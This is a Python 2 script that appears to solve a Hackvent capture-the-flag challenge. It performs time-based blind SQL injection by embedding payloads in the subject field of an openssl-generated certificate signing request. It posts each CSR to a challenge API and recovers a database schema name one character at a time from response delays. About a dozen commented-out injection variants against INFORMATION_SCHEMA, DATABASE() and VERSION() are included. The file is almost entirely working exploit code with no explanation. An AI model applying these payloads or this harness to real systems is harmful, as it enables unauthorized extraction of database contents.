import requests
import sys
import os
import subprocess
import time
import random
import string

#input = sys.argv[1]

sleep = 2
final=""

for h in xrange(30):
	for i in xrange(48,126):
		rX = ''.join([random.choice(string.ascii_letters + string.digits) for n in xrange(16)])
		#print "\n-------  "+chr(i)+"  --------\n"	
		#query = "' OR (SELECT COUNT(*) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA LIKE '%"+chr(i)+"%')>1 AND SLEEP("+str(sleep)+") '"
		#query = "' OR (select if(substring(database(),1,1)='"+chr(i)+"', sleep("+str(sleep)+"), sleep(0))) OR '"
		#query = "' + IF((SELECT MID(database(),1,1))=BINARY \""+chr(i)+"\",SLEEP("+str(sleep)+"),1) + '"
	#	query = "' + IF((SELECT MID(whatever,1,1) FROM wherever)=BINARY \"x\",SLEEP(2),1) + '"
		#query = "' + IF((SELECT MID(INFORMATION_SCHEMA.TABLES.TABLE_NAME,1,1) FROM INFORMATION_SCHEMA.TABLES)=BINARY \""+chr(i)+"\",SLEEP(2),1) + '"
		#query = "'+IF(MID(database(),1,1)=\""+chr(i)+"\",SLEEP("+str(sleep)+"),0)+ '"
		#query = "'+IF(MID(,1,1)=\""+chr(i)+"\",SLEEP("+str(sleep)+"),0)+ '"	
		#query = "' or IF(MID(VERSION(),1,1)='1',SLEEP(3),0) or ' " #works, MARIADB 10.xxx.xxx.xxx
		#query = "' or IF(substring(DATABASE(),"+str(h)+",1)='"+chr(i)+"', SLEEP(3),0) or '"
		#query = "' or IF(MID(DATABASE(),"+str(h)+",1)='"+chr(i)+"', SLEEP(3),0) or '"
		#query = ' or IF((SELECT COUNT(*) TABLE_NAME FROM INFORMATION_SCHEMA.TABLES) > '+str(h)+', sleep(3),0) or '
		#query = ' or IF((SELECT COUNT(*) TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_NAME LIKE \''+chr(i)+'%\') > 0, sleep(3),0) or '
		query = "' or if(mid((SELECT SCHEMA_NAME FROM information_schema.schemata limit 0,1),"+str(h)+",1)='"+chr(i)+"',sleep("+str(sleep)+"),0) or '"

		cmd='openssl req -new -newkey rsa:2048 -nodes -out day24.csr -keyout day24.key -subj "/C=GB/ST=A'+query+'/L=Wherever/O=Sec123/OU=basement/CN='+rX+'.biz" >/dev/null 2>&1'
		#print cmd

		stuff = os.system(cmd)

		csr_file = "day24.csr"
		csr=""	
		with open(csr_file, "r") as fp:
			for line in fp:
				csr+=line
		csr=csr.rstrip()
		#print csr

		url = "http://challenges.hackvent.hacking-lab.com:1088/php/api.php?function=csr&argument="+"&key=E7g24fPcZgL5dg78"
		data = {'csr': csr }
		start = time.time()
		r = requests.post(url, data = data)
		#print str(round(time.time()-start,2))
		#if str(r.status_code) in "200":	
			#print chr(i)
			#break	
		if round(time.time()-start,2) > sleep:
			final+=chr(i)
			print chr(i)	

print "\n====\n"+final